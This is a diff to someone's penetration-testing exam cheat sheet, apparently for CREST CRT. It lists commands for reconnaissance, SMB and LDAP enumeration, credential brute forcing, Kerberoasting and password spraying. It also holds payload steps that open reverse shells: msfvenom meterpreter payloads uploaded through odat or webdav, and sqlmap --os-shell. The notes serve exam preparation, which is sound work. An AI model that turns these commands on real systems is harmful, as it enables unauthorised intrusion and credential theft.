@@ -1,13 +1,23 @@
-CRT mptes
+CRT notes
+
+
 ### Appendix A ###
-WireShark, reading PCAP etc.
+WireShark, reading PCAP for connections etc. Set to eht0 or relevant network interface.
 
 ##### Fingerprinting #####
 ping -c 4 IP
 TTL 128 is Microsoft Windows
 TTL 64 is Linux but these values depend on hops.
-
 telnet $IP $PORT
+quit # disconnects from telnet
+nmap IP
+# runs a basic scan of the IP
+nmap -p 445 --script=smb-os-discovery IP
+# fingerprints the SMB port on the specified IP
+nmap -O IP
+# uses nmap to identify OS
+nmap -p 80 -sV IP
+# grabs the banner of the service on port 80
 
 ### Appendix B ###
 ##### DNS #####
@@ -16,6 +26,7 @@ dnsrecon -d $domain.TLD - looks at SRV records as well.
 dnsenum domain.TLD - zonetransfers, reads each record etc.
 host -v -t A domain.TLD - queries A records on the domain
 dig @subdomain.domain.TLD chaos version.bind txt # reveals DNS version
+enum4linux -a IP
 
 ### Appendix C ###
 
@@ -26,11 +37,83 @@ nmap -sn IPRange - host discovery
 nmap -sP IPRange - ping sweep
 netdiscover -r IPRange
 fping -a -g IPRange 2> /dev/null
-nmap -n -sn -PS IPRange - TCP sweep
+nmap -n -sn -PS IPRange0/24 - TCP sweep
+nmap -n -sn IP/IP -PR
+# identifies live hosts in IP range
+
+nmap -n -sn IP/IP -PR -oG - | awk '/Up$/{print$2}'
+# just prints the ips on their own without other information
+
+fping -a -g IP/IP 2> /dev/null
+# discovers live hosts
+
+fping -asgq IP/IP
+# gives a summary of targets and which are reachable etc.
+
+nmap -n -sn -PS IP/IP -oG - | awk '/Up$/{print $2}'
+# gives a list of live hosts when ICMP is blocked
+
+nmap -n -sn -PA IP/IP -oG - | awk '/Up$/{print $2}'
+# gives live hosts with TCP acknowledgement scan
+
+nmap -sF -T4 IP # fin scan
+ nmap -sX -T4 IP # xmas scan
+nmap -sS -T4 IP
 
 ##### IP Routing ##### 
-ip route add $subnet(that the target is on) via $gateway(the box you can access that can access the subnet)
+
+ip route add IPrange/range via gatewayIP
+ip route 192.168.2.0/24 via 192.168.1.250
 ping IP - can confirm connectivity if ping is open.
+sudo nmap -sn -iL ips.txt --script=ip-forwarding --script-args='target=ip'
+route add destinationNetwork mask subnetMask gatwayAddress
+ip route show
+
+Other possibilities with routing:
+route -n
+# shows machine's routing table
+## How to fix “Nexthop has invalid gateway” error
+ip route add {gateway_IP} dev {this_ip_reached_via_interface}  
+ip route add default via {gateway_IP}  
+ip route add 10.83.200.1 dev enp0s31f6  
+ip route add default via 10.83.200.1
+
+This might also work:
+ip route <destination network address> <destination network mask> <next hop router>
+# Adding a route via another route
+ip route add TargetIP via ExistingGatewayWithRoute dev Interface(eth0)
+# example:
+ip route add 192.168.2.0/24 via 192.168.1.100
+ip route add 192.168.3.100 via 192.168.1.100 dev eth0
+# OR
+route add –host TargetIP gw gatewayIProute -n
+# shows machine's routing table
+## How to fix “Nexthop has invalid gateway” error
+ip route add {gateway_IP} dev {this_ip_reached_via_interface}  
+ip route add default via {gateway_IP}  
+ip route add 10.83.200.1 dev enp0s31f6  
+ip route add default via 10.83.200.1
+
+This might also work:
+ip route <destination network address> <destination network mask> <next hop router>
+# Adding a route via another route
+ip route add TargetIP via ExistingGatewayWithRoute dev Interface(eth0)
+# example:
+ip route add 192.168.2.0/24 via 192.168.1.100
+ip route add 192.168.3.100 via 192.168.1.100 dev eth0
+# OR
+route add –host TargetIP gw gatewayIP
+
+## In Metasploit
+# shell
+run autoroute -h
+# shows autoroute menu
+
+run autoroute -s 10.1.13.0/24
+# adds route so now these are accessible
+
+run autoroute -p 
+# Shows all routes and which sessions they're applied to. 
 
 ##### UDP #####
 nmap -sU IP
@@ -60,24 +143,65 @@ get /filename
 
 ##### Desktop Access #####
 hydra -L users.txt -P pass.txt IP rdp - brute forces RDP
-redesktop IP - connects and opens login screen
+rdesktop IP - connects and opens login screen
+xfreerdp /u:username /p:password /v:IP
 vncviewer IP - same as above but for VNC
+Try in file dialogues:
+\\127.0.0.1\c$
+\\127.0.0.1\c$\users\filename
+Also try localhost
+# Internet explorer
+Check address bar and use file://c:\windows\system32\cmd.exe
+Or just  file://c:\windows\system32\ and navigate to the binary.
+
+# Batch files:
+Try creating a batch file with notepad.
+enter the contents 'cmd.exe'
+Change the extension to .bat.
+Double click to run the batch file. 
+It's also worth attempting contents such as:
+
+cmd.exe /k pause
+cmd.exe /c dir /s *flag.txt*
+
+
+## VNC
+nmap -p 5900 --open IP
+# scans VNC port
+msfconsole
+use auxiliary/scanner/vnc/vnc_login
+run
+#this brute forces VNC
+vncviewer IP
+# should present us with a login page
+
 
 ##### FTP #####
 nmap -p 21 --script=ftp-anon IP - checks for anonymous login
 ftp anonymous@IP
 ftp IP - then let it request username and password (some FTP services insist on this)
 If ftp doesn't work, try it in the network 'Browse Network' dialogue in kali and add ftp://IP
+Sometimes it might work in browser if it has a web interface too. 
+
+
 
 ##### SNMP #####
 nmap -sU -p 161 IP
 onesixtyone IP - discovers community strings
 snmpwalk -c public -v1 IP 
 snmp-check -c public -v1 IP - these commands can return huge amounts of information, so maybe output to a file and grep through.
+snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
 
 ##### SSH #####
 telnet IP 22 - gets banner
 nmap -p 22 --script=sshv1 IP
+ls /usr/share/nmap/scripts | grep ssh
+# searches nmap scripts for ssh
+crackmapexec ssh 192.168.94.112 -u users.txt -p passwords.txt
+nsc ssh 192.168.94.112 -u users.txt -p passwords.txt
+## Cracking SSH ##
+ssh2john filename > ssh.hash
+john ssh.hash --wordlist=/dir/file.txt
 
 ##### NFS ######
 nmap -p 2049 IP
@@ -93,7 +217,7 @@ xwd -root -screen -silent -display IP:window > screenshot.xwd
 xspy IP - sniffs keystrokes on remote X server
 
 Exploiting this further:
-msfconsole
+msfconsoleAppendix G - Web Technologies
 use exploit/unix/x11/x11_keyboard_interact
 set RHOSTS targetIP
 set payload cmd/unix/reverse_bash
@@ -118,15 +242,49 @@ ehlo hostname - give you a list of commands
 VRFY root - verifies root user exists.
 msfconsole has smtp_enum scanner
 
+##### POP3 #####
+nc -nv <IP> 110
+openssl s_client -connect <IP>:995 -crlf -quiet
+nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -port <PORT> <IP>
+telnet $ip 110 # connect to POP
+
+## POP commands ##
+  USER uid           Log in as "uid"
+  PASS password      Substitue "password" for your actual password
+  STAT               List number of messages, total mailbox size
+  LIST               List messages and sizes
+  RETR n             Show message n
+  DELE n             Mark message n for deletion
+  RSET               Undo any changes
+  QUIT               Logout (expunges messages if no RSET)
+  TOP msg n          Show first n lines of message number msg
+  CAPA               Get capabilities
+
 ### Appendix E ### Windows
 nmap -p 135,139,445 -oG windows_hosts.txt IPRange
 enum4linux -a IP - gives loads of information but generally looking at users
 nbtscan -v -s : IP - shows roles like 1cG is domain controller.
 smbclient -N -L //IP - null session
+smbclient -U '' -L \\\\IP\\share
+smbclient -U 'Guest' -L \\\\IP\\share
+smbclient -U 'Guest' -P 'sdfsd' -L \\\\IP\\share
 smbclient //IP/share
 while connected to SMB, use get or put to get or put files.
+
 impacket-GetUserSPNs -dc-ip IP -request domain/username:password - gets a hash if there's a service account and dumps a kerberos hash. 
+
 john --format=krb5tgs --wordlist=wordlist.txt kerberos.txt
+crackmapexec smb $IP -u users.txt -p $password -d $domain --continue-on-success
+nxc smb $IP -u users.txt -p $password -d $domain --continue-on-success
+kerbrute_windows_amd64.exe passwordspray .\usernames.txt "password" -d $domain
+crackmapexec smb IP -u guest -p "" --rid-brute
+
+##### LDAP #####
+ldapsearch -x -H ldap://IP -b "dc=something,dc=com" > ldapsearch.txt
+# queries ldap for everything
+cat ldapsearch.txt | grep -i "dn: CN="
+# filters for dn: CN= which gives a list of users, we can place them individually into a file.
+impacket-GetNPUsers -usersfile users.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip IP 'domain.tld/'
 
 ##### Desktop Breakout #####
 https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/ - read and memorise as best you can. Look at ways you can share files, using complete paths to files, various executables like ftp.exe, cmd.exe, powershell.exe etc. Use dialogue boxes and work with as many as you can. Check run, task manager to see if you can run tasks and start processes etc. 
@@ -151,15 +309,44 @@ If it's an AD box and a foothold is required, load kiwi opens mimikatz in metasp
 nmap -p 1433 --open IP
 nmap -p 1433 --script=ms-sql-info IP
 hydra -s PORT -l username(probably sa) -P password.txt -t 30 -w 15 IP mssql
+msfconsole
+use exploit/windows/mssql/mssql_payload
 
 # Oracle #
 oscanner -P 1521 -s IP -v - enumerates Oracle database
+nmap -p 1521 --open IP/range
+# searches for Oracle database server
+nmap -sV -p 1521 IP
+# checks service on port 1521
+tnscmd10g version -h IP -p 1521 --10G
+# enumerates Oracle database
+oscanner -P 1521 -s IP -v
+# enumerates oracle database, this can show credentials etc.
+./odat-libc2.17-x86_64 passwordguesser -s IP -p 1521 -d ORCL --accounts-file accounts/accounts.txt
+# attempts to identify valid credentials
+nmap -O IP
+# nmap identifies OS
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=port -f exe > access.exe
+# creates shell with msfvenom
+./odat-libc2.17-x86_64 passwordguesser -s IP -p 1521  -U username -P password -d ORCL --sysdba --putFile C:/ access.exe /root/access.exe
+# uses odat to upload our msfvenom reverse shell
+msfconsole
+use exploit/multi/handler
+run
 
-# MYSQL #
+./odat-libc2.17-x86_64 passwordguesser -s IP -p 1521  -U username -P password -d ORCL --sysdba --exec c:/access.exe
+# runs the reverse shell and we should catch it with meterpreter
+
+##### MYSQL #####
 nmap -p 3306 --script=mysql-empty-password IP
 mysql -h IP -u username -p
+mysql -u root -p password -h hostIP
 
-sqlmap -r req.txt
+SYNTAX
+show databases;
+use databasename;
+show tables;
+select * from TableName
 
 # PostgreSQL #
 nmap -p 5432 IP
@@ -167,9 +354,93 @@ nmap -p 5432 -sV IP - shows version info
 msfconsole has a postgre_login module that checks default credentials.
 hydra -L users.txt -P pass.txt IP postgres
 psql -h IP -U postgres - connects to postgres
+select version();
+# shows version of database
 
+\l
+# lists databases
+\c databaseName
+# switches to database name
+
+\dt
+# gives tables of database
+select * from users;
+# shows all from users table
+\q
+# quits database
 
 ##### Web Stuff #####
 really simple basic payloads, use active scanner on Burp.
+nikto -h http://IP
 Run Nikto or nmap --script=http-methods to identify dodgy methods. use both to be sure.
+# If it has webdav, we can catch the request with burp and PUT a file there. 
+curl -v -X OPTIONS http://IP
+nmap -p 80 --script=http-methods IP
+## XXE ##
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
 
+
+whatweb http://IP/wordpress
+
+msfconsole
+use auxiliary/scanner/http/options
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=IP lport=4444 -f raw
+# this will just output the file to stdout on terminal, we can then copy and paste it into a request in Burp
+
+cadaver http://IP/dav
+put /home/kali/shell.php
+# cadaver places the file in there. 
+
+msfconsole 
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost IP
+set lport 4444
+run
+# this will catch the shell when we open it in browser.
+
+## SQL on web ##
+sqlmap -r req.txt # need a saved request in burp first
+sqlmap -r req.txt --dbs # list databases
+sqlmap -r req.txt -D databasename --tables # list tables in specified database
+sqlmap -r req.txt -D databasename -T tablename -dump # list databases
+sqlmap -r req.txt  --os-shell
+
+
+
+##### R Services
+nmap IP
+# scans common ports on IP
+
+rlogin -l root IP
+# if rlogin is open we can connect
+
+rsh -l root IP
+# if rsh is open, we can connect with this
+
+rsh IP $command
+# run command
+
+rusers -al IP
+# show all users
+
+##### RPC Services #####
+nmap -p 111 IP
+# checks to see if RPC services is open
+
+rpcinfo -p IP
+# this will show a load of services and their ports
+
+##### FINGER ##### nmap -T4 -F -sV IP
+# fast scan of IP - if finger service is running
+finger user@IP
+# shows user accounts
+msfconsole
+use auxiliary/scanner/finger_users
+# users a metasploit module to enumerate users
